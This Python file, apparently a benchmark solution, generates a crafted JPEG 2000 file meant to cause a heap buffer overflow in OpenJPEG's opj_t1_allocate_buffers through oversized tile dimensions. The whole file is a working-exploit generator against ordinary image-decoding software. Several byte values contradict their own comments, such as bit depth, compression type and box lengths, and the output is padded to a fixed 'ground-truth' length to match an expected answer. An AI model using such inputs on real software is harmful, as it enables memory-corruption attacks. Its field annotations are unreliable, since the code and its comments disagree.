import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # We need to generate a JP2 file that triggers the heap buffer overflow
        # in opj_t1_allocate_buffers in the HT_DEC component.
        # The vulnerability is a malloc size error where tile dimensions cause
        # integer overflow in buffer size calculation.
        
        # Create a minimal JP2 file with large tile dimensions that will cause
        # integer overflow when calculating buffer size
        
        # JP2 signature box
        data = b"\x00\x00\x00\x0c" + b"jP  \r\n\x87\n"  # Signature box
        
        # File type box
        data += b"\x00\x00\x00\x14" + b"ftyp"  # File type box
        data += b"jp2 "  # Brand
        data += b"\x00\x00\x00\x00"  # Minor version
        data += b"jp2 " + b"jp2 " + b"jp2 "  # Compatible brands
        
        # JP2 header box
        data += b"\x00\x00\x00\x2d" + b"jp2h"  # JP2 header box
        
        # Image header box
        data += b"\x00\x00\x00\x16" + b"ihdr"  # Image header box
        data += b"\x00\x00\x40\x00"  # Height = 16384
        data += b"\x00\x00\x40\x00"  # Width = 16384
        data += b"\x00\x03"  # Number of components = 3
        data += b"\x07"  # Bits per component = 8
        data += b"\x00"  # Compression type = 7 (JPEG 2000)
        data += b"\x00"  # Colorspace unknown
        data += b"\x00"  # Intellectual property = 0
        
        # Colour specification box
        data += b"\x00\x00\x00\x0f" + b"colr"  # Colour specification box
        data += b"\x01"  # Method = enumerated colourspace
        data += b"\x00\x00\x10"  # Precedence = 16
        data += b"\x00"  # Approximation = 0
        data += b"\x00\x00\x00\x10"  # Enumerated colourspace = sRGB
        
        # Contiguous codestream box
        data += b"\x00\x00\x00\x0a" + b"jp2c"  # Contiguous codestream box marker
        
        # Start of codestream
        data += b"\xff\x4f"  # SOC marker
        
        # SIZ marker - sets image and tile dimensions
        # We use tile dimensions that will cause integer overflow:
        # (tile_x1 - tile_x0) * (tile_y1 - tile_y0) * sizeof(OPJ_UINT32)
        # 0x8000 * 0x8000 * 4 = 0x100000000 which overflows 32-bit
        data += b"\xff\x51"  # SIZ marker
        data += b"\x00\x2f"  # Marker length = 47
        data += b"\x00\x00"  # Rsiz = 0
        data += b"\x00\x00\x40\x00"  # Xsiz = 16384
        data += b"\x00\x00\x40\x00"  # Ysiz = 16384
        data += b"\x00\x00\x00\x00"  # XOsiz = 0
        data += b"\x00\x00\x00\x00"  # YOsiz = 0
        data += b"\x00\x00\x80\x00"  # XTsiz = 32768 (causes overflow)
        data += b"\x00\x00\x80\x00"  # YTsiz = 32768 (causes overflow)
        data += b"\x00\x00\x00\x00"  # XTOsiz = 0
        data += b"\x00\x00\x00\x00"  # YTOsiz = 0
        data += b"\x00\x03"  # Csiz = 3 components
        # Component 0
        data += b"\x07"  # Ssiz = 8 bits (signed=0, depth=7+1=8)
        data += b"\x01"  # XRsiz = 1
        data += b"\x01"  # YRsiz = 1
        # Component 1
        data += b"\x07"  # Ssiz = 8 bits
        data += b"\x01"  # XRsiz = 1
        data += b"\x01"  # YRsiz = 1
        # Component 2
        data += b"\x07"  # Ssiz = 8 bits
        data += b"\x01"  # XRsiz = 1
        data += b"\x01"  # YRsiz = 1
        
        # COD marker - specifies coding style
        data += b"\xff\x52"  # COD marker
        data += b"\x00\x1a"  # Marker length = 26
        data += b"\x44"  # Coding style = HT (High Throughput)
        data += b"\x00"  # Multiple component transformation
        # Progression order, layers, etc.
        data += b"\x00\x00\x00\x00\x00\x00\x00\x00"
        data += b"\x00\x00\x00\x00\x00\x00\x00\x00"
        data += b"\x00\x00\x00\x00\x00\x00"
        
        # QCD marker - quantization default
        data += b"\xff\x5c"  # QCD marker
        data += b"\x00\x05"  # Marker length = 5
        data += b"\x00"  # Sqcd = no quantization, 1 guard bit
        # Only 1 quantization value for all components
        data += b"\x00\x2f"  # 47 = 0.5 * 2^7 (reversible 5-3 transform)
        
        # Start of tile-part
        data += b"\xff\x90"  # SOT marker
        data += b"\x00\x0a"  # Marker length = 10
        data += b"\x00\x00"  # Isot = tile index 0
        data += b"\x00\x00\x00\x00"  # Psot = 0 (tile part length unknown)
        data += b"\x00"  # TPsot = 0
        data += b"\x00"  # TNsot = 0
        
        # SOD marker - start of data
        data += b"\xff\x93"  # SOD marker
        
        # Minimal packet data to trigger the vulnerability
        # This should cause allocation in opj_t1_allocate_buffers
        data += b"\x00" * 500  # Add padding to reach target size
        
        # EOC marker - end of codestream
        data += b"\xff\xd9"  # EOC marker
        
        # Pad to exact ground-truth length
        current_len = len(data)
        target_len = 1479
        
        if current_len < target_len:
            data += b"\x00" * (target_len - current_len)
        elif current_len > target_len:
            # Truncate if somehow longer (shouldn't happen)
            data = data[:target_len]
        
        return data